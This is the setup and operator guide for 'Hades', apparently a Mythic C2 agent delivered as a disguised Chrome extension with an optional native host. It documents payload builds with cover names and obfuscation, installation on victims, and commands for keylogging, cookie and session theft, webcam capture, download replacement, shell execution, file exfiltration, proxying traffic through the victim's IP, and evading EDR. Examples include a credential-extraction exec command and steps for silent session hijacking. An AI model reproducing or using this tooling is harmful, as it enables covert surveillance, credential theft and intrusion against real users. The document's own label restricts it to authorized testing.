# Hades — Mythic Custom Agent Setup Guide
**For authorized security testing only.**

---

## Table of Contents

1. [Prerequisites](#1-prerequisites)
1.5. [Server Component](#15-server-component-socks_bridgepy)
2. [Install Mythic](#2-install-mythic)
3. [Install C2 Profiles](#3-install-c2-profile-containers)
4. [Install Hades](#4-install-the-hades-payload-type)
5. [Build a Payload](#5-build-a-payload)
6. [Load the Extension](#6-load-the-extension-in-chrome)
7. [Verify the Callback](#7-verify-the-callback)
8. [Available Commands](#8-available-commands)
9. [Native Messaging Host](#9-native-messaging-host)
10. [IP Proxy](#10-ip-proxy)
11. [Push vs Poll](#11-push-vs-poll--when-it-matters)
12. [Opsec Recommendations](#12-opsec-recommendations)
13. [Encryption & Key Modes](#13-encryption--key-modes)
14. [Code Obfuscation (detailed)](#14-code-obfuscation)
15. [Modular Command Inclusion](#15-modular-command-inclusion)
16. [Filename & Identity Randomisation](#16-filename--identity-randomisation)
17. [Iterating on the Agent](#17-iterating-on-the-agent)
18. [Troubleshooting](#18-troubleshooting)

---

## 1. Prerequisites

| Requirement | Notes |
|---|---|
| Linux host (VM or cloud instance) | Runs the Mythic server |
| Docker + Docker Compose | Required by Mythic |
| Git | To clone Mythic and C2 profiles |
| Chrome browser on target | The extension runs here |
| Node.js (inside container) | Installed automatically in the Hades Docker image for `javascript-obfuscator` |

---

## 1.5 Server Component (socks_bridge.py)

The `server/socks_bridge.py` script runs on your C2 server alongside Mythic. It provides:
- **SOCKS5 proxy** on port 1080 (SSH tunnel to operator)
- **WebSocket bridge** for the extension connection

Start it before using `ip_proxy_start`:
```bash
python3 server/socks_bridge.py
```

Configuration is via constants at the top of the file. The bridge auto-generates TLS certificates as needed.

---

## 2. Install Mythic

**Step 1** — Clone the Mythic repository:
```bash
git clone https://github.com/its-a-feature/Mythic
cd Mythic
```

**Step 2** — Start Mythic for the first time:
```bash
./mythic-cli start
```

**Step 3** — Save the credentials printed to stdout (admin password, ports, etc.).

**Step 4** — Open the Mythic web UI at `https://<your-mythic-host>:7443` and log in.

---

## 3. Install C2 Profile Containers

Hades supports two transport modes. Install both C2 profile containers:

**Step 1** — Install WebSocket (primary, push-based transport):
```bash
./mythic-cli install github https://github.com/MythicC2Profiles/websocket
```

**Step 2** — Install HTTP (optional fallback, poll-based transport):
```bash
./mythic-cli install github https://github.com/MythicC2Profiles/http
```

**Step 3** — Verify both are running:
```bash
./mythic-cli status
```
Both `websocket` and `http` should show as `running`.

---

## 4. Install the Hades Payload Type

**Step 1** — Transfer the `hades_public/` directory to your Mythic server.

**Step 2** — Install it as a local payload type:
```bash
sudo ./mythic-cli install folder /path/to/hades_public
```

Mythic copies it into `InstalledServices/hades/`, builds the Docker image (which includes
Node.js and `javascript-obfuscator`), and starts the container.

**Step 3** — Verify registration:
```bash
./mythic-cli status
# hades should appear as running
```

**Step 4** — Confirm in the Mythic UI: **Payload Types** should list `hades` with a green
heartbeat.

### Setting the Agent Icon (optional)

The icon file must be placed in the **Mythic installation's** `agent_icons/` directory
with a filename matching the payload type name exactly:

```bash
cp /path/to/hades_public/agent_icons/hades_icon.svg /path/to/Mythic/agent_icons/hades.svg
./mythic-cli stop && ./mythic-cli start
```

Or set it via the UI: **Settings -> Payload Types -> hades -> Edit Icon**

---

## 5. Build a Payload

### Step 1 — Navigate to the payload builder

In the Mythic UI: **Payloads -> Generate New Payload**

### Step 2 — Select OS and payload type

- OS: `Chrome`
- Payload type: `hades`

### Step 3 — Configure build parameters

| Parameter | Type | Default | Description |
|---|---|---|---|
| `bg_filename` | String | *(blank = random)* | Background service worker filename (e.g. `sw.js`). Leave blank for a random name like `worker_c3d8.js` |
| `keylogger_filename` | String | *(blank = random)* | Keylogger content script filename (e.g. `input.js`). Leave blank for random. Only included if `keylog` command is selected |
| `autofill_filename` | String | *(blank = random)* | Autofill content script filename (e.g. `forms.js`). Leave blank for random. Only included if `autofill` command is selected |
| `obfuscate` | Choice | `medium` | JavaScript obfuscation level (see [section 14](#14-code-obfuscation)) |
| `native_host_features` | Choice | `proxy_only` | Features compiled into the native messaging host (see [section 9](#9-native-messaging-host)) |
| `proxy_host_level` | Choice | `standard` | Native host encryption level: `standard` (PSK shown in build output) or `none` (PSK generated at install time) |
| `extension_name` | String | *(blank = random)* | Chrome extension display name shown in `chrome://extensions`. Leave blank for a random cover name (e.g. "Tab Manager Plus") |
| `extension_description` | String | *(blank = random)* | Extension description. Leave blank for a random cover description |
| `native_host_name` | String | *(blank = random)* | Native messaging host name registered with Chrome (e.g. `com.apple.webkit.helper`). Blank = randomised cover name |
| `proxy_host_level` | Choice | `standard` | Native host encryption: `standard` (PSK in build output) or `none` (PSK generated at install time) |
| `socks_psk` | String | *(blank)* | PSK for the Go SOCKS5 binary (`socks_start`). Must match `-X main.PSK=<val>` used when compiling the Go binary |
| `windows_launcher` | Choice | `none` | Windows native host launcher type — see below |
| `deploy_label` | String | *(blank)* | Optional label baked into payload — appears in callback Domain field to identify the deployment target |

**`native_host_features` choices:**

| Choice | Included capability | Use case |
|---|---|---|
| `none` | Extension only, no native host | Stealth-first; no disk artefacts from installer |
| `proxy_only` | IP proxy relay | SOCKS tunnelling |
| `files_only` | File browser/download/upload | File system access only |
| `exec_only` | Shell command execution | RCE without proxy overhead |
| `proxy_and_files` | Proxy + file browser | Combined recon and pivot |
| `proxy_and_exec` | Proxy + shell exec | Proxy with on-host execution |
| `files_and_exec` | File browser + shell exec | File + RCE without proxy |
| `all` | All three features | Full capability |

**`windows_launcher` choices** *(only relevant for Windows targets)*:

| Choice | Process tree | Notes |
|---|---|---|
| `none` *(default)* | `Chrome → wscript.exe → python.exe` | VBScript fallback; avoids `cmd.exe`; no extra build step |
| `go_launcher` | `Chrome → <random>.exe → python.exe` | Pre-compiled Go launcher cross-compiled in the Mythic container; launcher name randomised each build (e.g. `chrome_helper.exe`, `sync_b3a7.exe`); `python.exe` is a signed PSF binary; requires Go in the Mythic container (already in Dockerfile) |

> Selecting `go_launcher` triggers `GOOS=windows GOARCH=amd64 go build` during payload generation. The resulting `.exe` (~1.5 MB, stripped symbols) is included in the ZIP with a new random name on every build. On install, `install.py` scans for any `.exe` in its directory and uses it automatically — the name does not need to be known in advance.

### Step 4 — Configure C2 profiles

Add one or both transport profiles:

**websocket** *(primary — recommended)*

| Parameter | Value |
|---|---|
| `callback_host` | Your Mythic server IP or domain |
| `callback_port` | `443` (prod) or `8081` (lab) |
| `ENDPOINT_REPLACE` | `/` |
| `encrypted_exchange_check` | `true` (EKE — recommended) or `false` (static PSK) |

**http** *(optional — fallback transport)*

| Parameter | Value |
|---|---|
| `callback_host` | Your Mythic server IP or domain |
| `callback_port` | `80` or `443` |
| `ENDPOINT_REPLACE` | `/` |
| `encrypted_exchange_check` | `true` or `false` (must match the websocket setting) |

> **Enabling EKE (RSA key exchange):** The `encrypted_exchange_check` setting must be
> `true` on the **C2 profile instance** *before* building. Mythic generates the RSA key
> pair when the profile starts. If the profile was originally created with the setting
> as `false`, the key parameter contains an AES key (32 bytes), not an RSA public key
> (~550 bytes). To fix:
>
> 1. **C2 Profiles** in the Mythic UI -> stop the profile
> 2. Set `encrypted_exchange_check = true`, then restart the profile
> 3. Now build the payload — the builder detects the RSA key automatically
>
> If the builder detects a short key despite EKE being requested, it falls back to PSK
> mode and shows a warning in the build message.

### Step 5 — Select commands

On the **Commands** step, check the commands you want included. The builder strips code
for unselected commands from `background.js` (see [section 15](#15-modular-command-inclusion)).

- **`exit_running` or `exit_full` must be selected** or Mythic will warn "No exit command selected"
- `sleep`, `exit_running`, and `exit_full` are always included regardless of selection
- Content scripts (`keylogger.js`, `autofill.js`) are only packaged if `keylog` is selected
- Using **Select All** is the easiest approach for full capability

### Step 6 — Generate and download

Click **Generate**. Download the resulting `.zip` file.

The build message shows a summary: transport URLs, crypto mode, obfuscation level, number
of commands included, and which content scripts were excluded.

> When both profiles are configured, WebSocket is the primary transport and HTTP is the
> fallback when the socket is unavailable.

---

## 6. Load the Extension in Chrome

**Step 1** — Unzip the downloaded `.zip` into a local folder.

**Step 2** — Open Chrome and navigate to `chrome://extensions`.

**Step 3** — Enable **Developer mode** (toggle in the top right).

**Step 4** — Click **Load unpacked** and select the unzipped folder.

The extension loads immediately and connects back to Mythic. Within a few seconds a new
callback appears under **Callbacks**.

---

## 7. Verify the Callback

**Step 1** — In the Mythic UI, go to **Callbacks**.

**Step 2** — A new entry should appear showing the Chrome profile email, OS, architecture,
and a pseudo-PID (derived from the extension's unique ID — Chrome extensions cannot access
OS-level PIDs, so a stable hash of `chrome.runtime.id` is used instead).

**Step 3** — Click the callback to open the operator console.

**Step 4** — Test with: `sysinfo`

---

## 8. Available Commands

**Opsec legend:** 🟢 Low — no new processes, no disk writes, invisible to user  /  🟡 Medium — detectable by monitoring or mildly visible  /  🔴 High — creates processes, writes disk, or visible to victim

### Core / Agent Control

| Command | Noise | Description | Notes |
|---|---|---|---|
| `sleep <seconds>` | 🟢 | Change tasking poll interval | Affects both WS and HTTP. No cap — keepalive is separate |
| `sysinfo` | 🟢 | Platform, Chrome profile, env info. Adds OS-level data when native host active | Queries native host if `native_start`/`ip_proxy_start` active |
| `idle` | 🟢 | Query Chrome idle/locked state | Threshold: 60 s inactivity |
| `uptime` | 🟢 | Extension install age + service worker uptime | -- |
| `exit_running` | 🟢 | Stop the C2 callback loop; extension stays installed and dormant | Closes socket, stops heartbeat; can be reactivated via extension reload |
| `exit_full` | 🟢 | Stop callback and silently uninstall the extension | Calls `chrome.management.uninstallSelf` |

### Screen / Input

| Command | Noise | Description | ATT&CK |
|---|---|---|---|
| `screenshot` | 🟢 | Capture the active window's visible tab as PNG; composites GPU-decoded video frames (e.g. YouTube) into the output | T1113 |
| `screenshot_all` | 🟢 | Capture active tab of every open window → single HTML bundle; composites video frames per tab | T1113 |
| `keylog` | 🟡 | Start keystroke capture (flushes every 200 chars) | T1056.001 |
| `disable_keylog` | 🟢 | Stop keylogger and flush remaining buffer | T1056.001 |
| `clipboard` | 🟢 | Read current clipboard contents via active tab | T1115 |
| `geolocation` | 🟡 | Pull lat/lon if active page has location permission | T1430 |
| `webcam` | 🔴 | Capture webcam frame via active tab that has camera permission | T1125 |

> `keylog` injects a content script that hooks `keydown` events — detectable by AV solutions monitoring DOM event listeners. `geolocation` and `webcam` only work on pages where the user has already granted the permission; some pages show a camera/location indicator.

### Browser Data Collection

| Command | Noise | Description | ATT&CK |
|---|---|---|---|
| `dump_cookies` | 🟢 | Dump all browser cookies as JSON | T1539 |
| `dump_tabs` | 🟢 | List all open tabs (title, URL, status) | T1217 |
| `history` | 🟢 | Browser history — text ≤100 entries, file >100 | T1217 |
| `bookmarks` | 🟢 | Full bookmark tree as plain text | T1217 |
| `local_storage` | 🟢 | Dump active tab's `localStorage` and `sessionStorage` | T1539, T1552 |
| `session_export [origin]` | 🟢 | Full session package: cookies + localStorage + sessionStorage | T1539, T1185 |
| `find_in_dom <pattern> [flags]` | 🟢 | Regex search across all open tab DOMs (up to 50 matches/tab) | T1552, T1005 |
| `notifications` | 🟢 | `Notification.permission` state for all tabs | T1082 |
| `download_history [limit] [url_filter]` | 🟢 | Browser download history — text ≤100, file >100 | T1005 |

All browser data collection commands use Chrome extension APIs only — no disk access, no subprocesses, no network calls beyond what the victim's browser is already doing.

### Navigation / Injection

| Command | Noise | Description | ATT&CK |
|---|---|---|---|
| `inject_tab <current\|new> <url>` | 🟡 | Navigate active tab or open new tab to a URL | T1185 |
| `download_url <url> [filename]` | 🟡 | Fetch URL using browser's live cookie jar; returns as file | T1530, T1005 |

> `inject_tab` is visible to the victim — they see their browser navigate. `download_url` generates a server-side request log with the browser's cookies and UA.

### Installed Software

| Command | Noise | Description | ATT&CK |
|---|---|---|---|
| `list_extensions` | 🟢 | All installed Chrome extensions with IDs, permissions, and install type | T1518 |
| `list_pwas` | 🟢 | Installed Progressive Web Apps and hosted/packaged apps | T1518 |
| `check_permissions` | 🟢 | Report which sensitive Chrome API permissions the extension holds | T1082 |

### Network Monitoring

| Command | Noise | Description | ATT&CK |
|---|---|---|---|
| `network_monitor_start` | 🟡 | Log all browser HTTP/HTTPS requests (URL, method, status, content-type) | T1040, T1557 |
| `network_monitor_stop` | 🟢 | Stop monitoring; returns ≤100 lines as text, >100 as file | T1040 |

> Installs a `chrome.webRequest` listener — active listeners are visible to security extensions or browser inspection tools. Stop promptly; auth headers in captured traffic are sensitive.

### Download Interception

| Command | Noise | Description | ATT&CK |
|---|---|---|---|
| `download_watch` | 🟢 | Real-time feed of every download the user initiates | T1005 |
| `download_watch_stop` | 🟢 | Stop watch and return summary | T1005 |
| `download_intercept_start` | 🔴 | Cancel a matching download and silently replace it with a custom file | T1036, T1565 |
| `download_intercept_stop [pattern]` | 🟢 | Remove one rule by pattern, or all rules if blank | T1036 |

> `download_intercept_start` is the noisiest extension command — the original file disappears and a different file appears. Users frequently notice. The replacement saves with the original filename via `chrome.downloads.onDeterminingFilename`.

`download_intercept_start` parameters:

| Parameter | Required | Description |
|---|---|---|
| `pattern` | Yes | URL or filename substring to match (case-insensitive) |
| `content_b64` | Either/or | Base64-encoded replacement file content (small files) |
| `replace_url` | Either/or | URL to fetch replacement from at intercept time (large files) |

### Native Host — Activation

*Requires native host installed on victim. See [section 9](#9-native-messaging-host).*

| Command | Noise | Description | ATT&CK |
|---|---|---|---|
| `native_start [psk=<key>]` | 🟡 | Connect native host only — no SOCKS proxy. Enables file and exec commands | T1059, T1083 |
| `native_stop` | 🟢 | Disconnect native host started by `native_start` | — |
| `ip_proxy_start url=<wss://c2/path> [socks_port=1080] [psk=<key>]` | 🟡 | Native host + SOCKS5 relay — proxying AND file/exec | T1090.001, T1185 |
| `ip_proxy_stop` | 🟢 | Stop ip_proxy relay and disconnect native host | T1090 |

> Both `native_start` and `ip_proxy_start` create a Python subprocess as a child of Chrome — an unusual process relationship that some EDR rules flag. The native host manifest and `.bat` launcher (Windows) are written to disk at install time, not activation time.

**Which to use:**

| Need | Command |
|---|---|
| File access or exec only, no proxying | `native_start` |
| SOCKS proxy only (`proxy_only` build) | `ip_proxy_start` |
| SOCKS proxy + file/exec (`all` build) | `ip_proxy_start` |

### File System (Native Host)

*Requires native host with `files` or `all` feature, and `native_start` or `ip_proxy_start` active.*

**Backend:** All file commands run entirely in Python's standard library — `os`, `stat`, `base64`. No shell, no subprocess, no Win32 API calls. They map directly to OS kernel syscalls via Python's C extensions:

| Command | Noise | Python call | Syscall |
|---|---|---|---|
| `file_ls path=<dir>` | 🟢 | `os.listdir()` + `os.stat()` per entry | `readdir()` + `stat()` |
| `file_download path=<file>` | 🟡 | `open(path,'rb').read()` in 384 KB chunks | `open()` + `read()` |
| `file_upload path=<dest> file_id=<id>\|content_b64=<b64>` | 🟡 | `open(path,'wb').write()` per chunk | `open()` + `write()` |
| `file_delete path=<file>` | 🔴 | `os.remove()` / `os.rmdir()` | `unlink()` / `rmdir()` |
| `file_mkdir path=<dir>` | 🟡 | `os.makedirs()` | `mkdir()` recursive |

**Chunked transfer:** Chrome's native messaging has a hard **1 MB per-message limit**. Files larger than ~750 KB would silently fail without chunking. Both download and upload split transfers into 384 KB raw chunks (~512 KB base64), well under the limit:

- **Download:** native host reads chunks sequentially and emits one message per chunk with `chunk_num` / `total_chunks`. The extension accumulates all chunks and joins them before sending to Mythic.
- **Upload:** the extension splits the base64 data into chunks and sends them sequentially. The first chunk opens the file with `wb` (create/overwrite); subsequent chunks use `ab` (append). The native host's existing append logic handles this with no additional changes.

> `file_ls` output includes permissions, size, and **last-modified timestamp** (UTC). `file_download` reads the file in place — accessing sensitive paths (SSH keys, browser databases, `/etc/shadow`) will be logged by file access auditing on hardened hosts. `file_upload` writing to startup directories or executable paths triggers most EDRs. `file_delete` creates a forensic gap and should be used carefully.

### Shell Execution (Native Host)

*Requires native host with `exec` or `all` feature, and `native_start` or `ip_proxy_start` active.*

| Command | Noise | Description | ATT&CK |
|---|---|---|---|
| `exec <command>` | 🟢–🔴 | Execute a command via native host (noise depends on mode — see below) | T1059 |

`exec` parameters (JSON or plain string):

| Parameter | Default | Description |
|---|---|---|
| `cmd` | *(required)* | Command to run, or Python code for `mode=python` |
| `mode` | `direct` | `direct` / `python` / `shell` — see table below |
| `cwd` | *(native host dir)* | Working directory |
| `timeout` | `60` | Seconds before kill |

**`exec` mode — opsec comparison:**

| Mode | Noise | How it works | Process tree | Shell features |
|---|---|---|---|---|
| `python` | 🟢 | `exec()` inside native host process — no fork, no subprocess | None — runs in native host memory | Python only — no shell syntax |
| `direct` *(default)* | 🟡 | `shlex.split(cmd)` → `subprocess.run(shell=False)` → OS `execve()` | `proxy_host.py` → `whoami` | Simple commands only — no `\|`, `>`, `&&`, globs |
| `shell` | 🔴 | `/bin/sh -c cmd` (Unix) or `cmd.exe /c cmd` (Windows) | `proxy_host.py` → `/bin/sh` → `whoami` | Full shell — pipes, redirects, all shell syntax |

**`direct` mode:** `shlex.split` tokenises the string as a POSIX shell would parse a single command — `"ls -la /tmp"` → `["ls", "-la", "/tmp"]` — then calls `execve()` directly. No shell exists in the process tree. Cannot use pipes, redirects, wildcards, or chained commands; use `mode=shell` only when those features are required and the added EDR visibility is acceptable.

**Windows path escaping in `mode=python`:** JSON decodes `\\` to a single `\` before the code reaches Python. Python then interprets `\U`, `\u`, `\N` etc. as Unicode escape sequences, causing `unicodeescape` errors on paths like `C:\Users`. The native host auto-detects this and normalises backslashes in string literals that look like Windows paths (`X:\...`). You can also avoid the issue entirely by using forward slashes (`C:/Users/...`) or raw strings (`r'C:\Users\...'`).

**`python` mode examples** (zero subprocess overhead):
```
exec {"cmd": "import socket; print(socket.gethostname())", "mode": "python"}
exec {"cmd": "import os; print(os.listdir('/tmp'))", "mode": "python"}
exec {"cmd": "import subprocess; r=subprocess.run(['id'],capture_output=True); print(r.stdout.decode())", "mode": "python"}
```

**`direct` mode examples:**
```
exec whoami
exec {"cmd": "security find-generic-password -wa Chrome", "mode": "direct"}
exec {"cmd": "netstat -an", "mode": "direct"}
```

**`shell` mode examples** (use only when pipes/redirects are needed):
```
exec {"cmd": "cat /etc/hosts | grep -v localhost", "mode": "shell"}
exec {"cmd": "find /Users -name '*.plist' 2>/dev/null | head -20", "mode": "shell"}
```

---

## 9. Native Messaging Host

The native messaging host (`proxy_host.py`) extends the extension with OS-level capabilities: outbound TCP relay for SOCKS proxying, filesystem access, and arbitrary command execution.

### Build-time feature selection

The `native_host_features` build parameter controls what code is compiled into the host. Choose `none` for an extension-only payload (no native host files in the ZIP, no disk artefacts). For any other choice the ZIP includes `native_host/proxy_host.py` (encrypted bootstrap) and `native_host/install.py`.

### Installation on victim

**Step 1** — Extract the ZIP on the victim machine.

**Step 2** — Run the installer with the extension ID (found in Mythic callback Domain field).

#### macOS / Linux

```bash
python3 native_host/install.py --extension-id <32-char-id>
```

The installer embeds the absolute Python path in the file's shebang so Chrome can find it even with a stripped PATH. No shell wrapper is created.

#### Windows

> **Windows Store Python warning.** The stub at `AppData\Local\Microsoft\WindowsApps\python3.exe` is **not** a real interpreter — it opens the Microsoft Store when invoked non-interactively. Chrome will silently fail to start the native host with no visible error. The installer detects this and warns you, but the fix is to use a real Python.

**Step 2a** — Confirm you have a real Python installed from [python.org](https://python.org). Look for it at a path like:
```
C:\Users\<you>\AppData\Local\Programs\Python\Python312\python.exe
C:\Python312\python.exe
```

**Step 2b** — Run the installer, specifying the real Python explicitly:
```cmd
python native_host\install.py ^
    --extension-id <32-char-id> ^
    --python "C:\Users\<you>\AppData\Local\Programs\Python\Python312\python.exe"
```

The installer detects which launcher type is present in the ZIP directory and configures accordingly:

**With `go_launcher` (recommended):** A pre-compiled `.exe` with a randomised name (e.g. `chrome_helper.exe`) is present in the ZIP. The installer writes `launcher.cfg` with the detected Python path and points the manifest at the `.exe`.

**Without `go_launcher` (fallback):** The installer creates a VBScript `.vbs` launcher. This avoids `cmd.exe` but still routes through `wscript.exe`.

| Launcher type | Process tree |
|---|---|
| Go launcher (`go_launcher` build) | `Chrome → chrome_helper.exe → python.exe (signed)` |
| VBScript fallback | `Chrome → wscript.exe → python.exe (signed)` |

The native messaging manifest is written to JSON and registered in the Windows registry at:
```
HKCU\SOFTWARE\Google\Chrome\NativeMessagingHosts\<host-name>
```
The registry value (Default) is the **path to the manifest JSON file** — not the executable directly. Expand the tree in `regedit` fully to `NativeMessagingHosts\<host-name>` to see it.

If the installer prints a Store Python warning, install Python from python.org and re-run with `--python`.

#### Verify the install

**With Go launcher:**
```
[+] Launcher : C:\...\chrome_helper.exe  (pre-compiled Go launcher)
    Config   : C:\...\launcher.cfg
    Process tree: Chrome → launcher.exe → python.exe (signed)
[+] Manifest : C:\...\com.apple.desktop.agent.json
[+] Registry : HKCU\SOFTWARE\Google\Chrome\NativeMessagingHosts\com.apple.desktop.agent
```

**With VBScript fallback:**
```
[+] Launcher : C:\...\desktop_agent.vbs  (wscript.exe; no launcher.exe found in ZIP)
    Process tree: Chrome → wscript.exe → python.exe (signed)
[+] Manifest : C:\...\com.apple.desktop.agent.json
[+] Registry : HKCU\SOFTWARE\Google\Chrome\NativeMessagingHosts\com.apple.desktop.agent
```

**Step 3** — For `proxy_host_level=standard` builds the PSK is shown in the Mythic build output. Copy it before closing the build window:
```
Native host PSK (copy before closing this window): a3f9c1e2b4d6e8f0...
```

Use this PSK with whichever activation command applies:
```
# No proxy needed (exec_only / files_only / files_and_exec build):
native_start psk=a3f9c1e2b4d6e8f0...

# With SOCKS proxy (proxy_only / proxy_and_exec / all build):
ip_proxy_start url=wss://<c2>/proxy-ws psk=a3f9c1e2b4d6e8f0...
```

For `proxy_host_level=none` builds the installer generates the PSK itself and prints it at the end of its output.

### Uninstall

**macOS / Linux:**
```bash
python3 native_host/install.py --extension-id <id> --uninstall
```

**Windows:**
```cmd
python native_host\install.py --extension-id <id> --uninstall
```

---

## 10. IP Proxy

`ip_proxy_start` turns the victim's Chrome into a SOCKS5 exit node. All TCP connections made by the operator's browser emerge from the victim's IP and network.

### Step 1 — Start the infrastructure

```bash
# On the C2 server
python3 server/socks_bridge.py

# In Mythic
ip_proxy_start url=wss://your-c2.com/proxy-ws psk=<psk-from-build>
```

### Step 2 — Launch the operator browser

Launch a dedicated Chrome instance pointed at the SOCKS proxy:

```bash
# SSH tunnel — SOCKS only
ssh -L 1080:127.0.0.1:1080 user@c2-server

# Get victim's User-Agent from bridge startup log:
#   Registered: d2fbb215  v=4.8.6  ua=Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 ...

open -na "Google Chrome" --args \
    --user-data-dir="/tmp/chrome-proxy" \
    --proxy-server="socks5://127.0.0.1:1080" \
    --proxy-bypass-list="<-loopback>" \
    --user-agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
```

Use `--proxy-bypass-list="<-loopback>"` to route loopback connections through the proxy. Use FoxyProxy in your normal Chrome profile to selectively route specific domains without a dedicated Chrome instance.

### User-Agent matching

The operator Chrome sends its own `User-Agent` header to every website visited. This header is **not** proxied from the victim — it reveals the operator's OS and Chrome version. To match the victim:

1. Find the victim's UA in the bridge startup log: `Registered: <id>  v=<ver>  ua=Mozilla/5.0 ...`
2. Pass the full UA string to `--user-agent` in your Chrome launch command (as shown above)

> **Note:** `Sec-CH-UA` client hint headers reflect the actual binary version of Chrome and are not fully controlled by `--user-agent`. Use a Chrome version close to the victim's to minimise discrepancy.

### Silent login (no victim prompt)

If the victim has an active session, steal their cookies first:

```
# In Mythic
dump_cookies
# or
session_export https://<target.example.com>
```

Import the cookies into the operator browser before navigating to the target. The existing session means no new authentication challenge fires and the victim receives no notification.

> **DBSC note:** Google services (Gmail, Drive) use Device-Bound Session Credentials (DBSC), which cryptographically bind sessions to the victim's device keys. Stolen cookies alone are not sufficient for DBSC-protected sessions from a different browser. Use `download_url` or `inject_tab` via the Hades extension to access Google resources through the victim's own Chrome instead.

---

## 11. Push vs Poll -- When It Matters

### How it works

Both WebSocket and HTTP are **poll-based** -- the agent sends `get_tasking` at the sleep
interval. Mythic's WebSocket C2 profile is request-response over a persistent connection,
not true server-push. The key difference is connection efficiency:

- **WebSocket**: The socket stays open between polls. Each `get_tasking` is a message on
  the existing connection -- no TCP/TLS handshake overhead. Lower latency per poll, less
  conspicuous than repeated HTTP connections.
- **HTTP**: Each poll is a fresh HTTP POST. Higher per-request overhead but simpler network
  profile (looks like normal web requests).
- **Outbound data** (responses, files, real-time notifications) is always sent immediately
  in both modes.

### Transport comparison

| | WebSocket | HTTP |
|---|---|---|
| Task delivery | Polls on `sleepIntervalMs` | Polls on `sleepIntervalMs` |
| Idle traffic pattern | Periodic messages on open socket | Periodic HTTP POSTs |
| Per-poll overhead | ~100 bytes (WS frame) | Full HTTP request + TLS | 
| Outbound responses | Immediate | Immediate |
| Connection overhead | One persistent socket | New connection per cycle |
| Reconnect on wake | Automatic (alarm + ensureConnected) | Automatic |

### Recommendations

- **WebSocket** for lower overhead and faster round-trips. Best when the C2 domain has
  WebSocket-compatible infrastructure (reverse proxy, CDN).
- **HTTP** when WebSocket is blocked or when the traffic pattern of periodic HTTP requests
  blends better with the target environment.
- Keep `sleep` at 5--10 s for responsive operations. Longer intervals (60 s, 5 min, etc.)
  are fully supported — the service worker stays alive via a separate silent keepalive
  timer (20 s `chrome.storage.local` write, zero network traffic). Avoid sub-3 s intervals
  as they generate conspicuous polling traffic.

---

## 12. Opsec Recommendations

### Extension delivery

- Developer mode extensions show a visible banner and may be blocked by enterprise policy.
  For stealth, deploy via group policy (`ExtensionInstallForcelist`) or enterprise Chrome
  management.
- The extension's name and description are randomised at build time (or set by the
  operator). No static IOCs like "Hades" appear in the delivered zip.

### C2 traffic

- Use `wss://` / `https://` with a valid TLS certificate on a clean-reputation domain.
- The `User-Agent` is Chrome's native UA -- traffic blends with normal browsing.
- Use port `443`. Avoid `8080`, `4444`, etc.
- WebSocket push mode produces zero idle traffic. HTTP poll creates a periodic pattern.
- The C2 URL is embedded in the payload. If the extension is obtained from disk, the
  infrastructure is exposed. Rotate domains between operations.

### Sleep interval (HTTP only)

- Default: 10 s. Reasonable for most operations.
- Very short intervals (< 3 s) produce noticeable polling that UEBA tools may flag.
- The current heartbeat does not jitter. For higher opsec, add random jitter in code.
- WebSocket mode does not poll at all -- the sleep interval is irrelevant.

### Crypto and key exposure

- **PSK mode** (`encrypted_exchange_check = false`): a static AES-256 key is embedded in
  the payload. If the `.zip` is captured, all traffic is decryptable.
- **EKE mode** (`encrypted_exchange_check = true`, recommended): only the RSA public key
  is embedded. Session keys are negotiated at runtime and never touch disk. Even if the
  payload is captured, traffic cannot be decrypted without Mythic's RSA private key.
- With obfuscation enabled, crypto constants are buried in RC4-encoded string arrays and
  control flow. Obfuscation is not encryption but raises extraction effort. Use EKE to
  make key extraction irrelevant.

### Sensitive commands

- `session_export` and `local_storage` produce files with tokens and potentially plaintext credentials. Limit operator access.
- `network_monitor_start` captures all HTTP traffic including auth headers. Stop promptly.
- `download_intercept_start` is visible to the user (original download disappears).
- `keylog` buffers accumulate in memory. Keep sessions short.
- `native_start` / `ip_proxy_start` install a native messaging host which is visible in Chrome's subprocess list and may be flagged by EDR.

### Command opsec reference

The table below rates each command by its operational noise level.

**Legend:** 🟢 Low — no new processes, no disk writes, invisible to user  /  🟡 Medium — detectable by monitoring tools or mildly visible  /  🔴 High — creates processes, writes disk, visible to user or security tooling

#### Extension-only commands (no native host required)

| Command | Noise | Notes |
|---|---|---|
| `sleep`, `uptime`, `idle` | 🟢 | No I/O |
| `sysinfo` | 🟢 | Reads browser internals only |
| `screenshot`, `screenshot_all` | 🟢 | Tab capture, no disk write |
| `dump_cookies`, `dump_tabs` | 🟢 | Reads Chrome stores |
| `history`, `bookmarks` | 🟢 | Reads Chrome stores |
| `local_storage`, `session_export` | 🟢 | Reads browser memory |
| `find_in_dom` | 🟢 | DOM search |
| `clipboard` | 🟢 | Single read, no persistence |
| `list_extensions`, `list_pwas`, `check_permissions`, `notifications` | 🟢 | Read-only |
| `download_url` | 🟡 | Network request logged server-side |
| `inject_tab` | 🟡 | Victim sees browser navigate |
| `network_monitor_start` | 🟡 | Installs webRequest listener; stop promptly |
| `download_history` | 🟢 | Reads Chrome history |
| `download_watch` | 🟢 | Passive listener |
| `download_intercept_start` | 🔴 | Victim notices replaced file |
| `keylog` | 🟡 | Content script injection; AV may flag DOM hooking |
| `autofill` | 🟡 | Reads form autofill data |
| `webcam`, `geolocation` | 🟡 | Requires active page permission |
| `exit_running` | 🟢 | Stops callback loop; extension remains installed |
| `exit_full` | 🟢 | Stops callback loop and silently uninstalls extension |

#### Native host commands

| Command | Noise | Notes |
|---|---|---|
| `native_start` | 🟡 | Spawns Python subprocess from Chrome; process chain depends on `windows_launcher` build option |
| `ip_proxy_start` | 🟡 | Same as above plus outbound WSS connection |
| `file_ls` | 🟢 | Read-only directory listing |
| `file_download` | 🟡 | Disk read; Spotlight/filesystem monitors may log access |
| `file_upload` | 🟡 | Disk write; creates/modifies files |
| `file_delete` | 🔴 | Destructive; creates forensic gap |
| `file_mkdir` | 🟡 | Disk write |
| `exec mode=python` | 🟢 | No subprocess; runs inside native host process — most opsec-safe exec mode |
| `exec mode=direct` | 🟡 | Direct `execve()` — no shell in process tree, but child process visible to EDR |
| `exec mode=shell` | 🔴 | Shell process (`/bin/sh` or `cmd.exe`) spawned from Python; classic malicious pattern flagged by most EDRs |

#### `exec` mode selection guide

Use `mode=python` when the task can be expressed as Python — it runs entirely within the native host process with no new process creation:
```
exec {"cmd": "import socket; print(socket.gethostname())", "mode": "python"}
